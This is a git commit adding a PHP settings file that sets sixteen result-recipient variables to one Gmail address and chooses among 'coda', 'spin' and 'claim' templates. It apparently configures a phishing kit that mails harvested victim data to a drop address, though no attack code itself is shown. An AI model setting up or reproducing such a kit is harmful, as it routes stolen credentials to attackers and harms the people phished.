0266a80fcc3c61ee34c110a129ef8f892907a125
faznesia <155076229+faznesia@users.noreply.github.com>
2023-12-28 19:52:44 +0700

    Add files via upload

---
+++ setting.php
@@ -0,0 +1,21 @@
+<?php
+$email1 = 'nampungress98@gmail.com';
+$email2 = 'nampungress98@gmail.com';
+$email3 = 'nampungress98@gmail.com';
+$email4 = 'nampungress98@gmail.com';
+$email5 = 'nampungress98@gmail.com';
+$email6 = 'nampungress98@gmail.com';
+$email7 = 'nampungress98@gmail.com';
+$email8 = 'nampungress98@gmail.com';
+$email9 = 'nampungress98@gmail.com';
+$email10 = 'nampungress98@gmail.com';
+$email11 = 'nampungress98@gmail.com';
+$email12 = 'nampungress98@gmail.com';
+$email13 = 'nampungress98@gmail.com';
+$email14 = 'nampungress98@gmail.com';
+$email15 = 'nampungress98@gmail.com';
+$email16 = 'nampungress98@gmail.com';
+$jenisress = $coda; //$coda, $spin, $claim
+$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
+?>
+
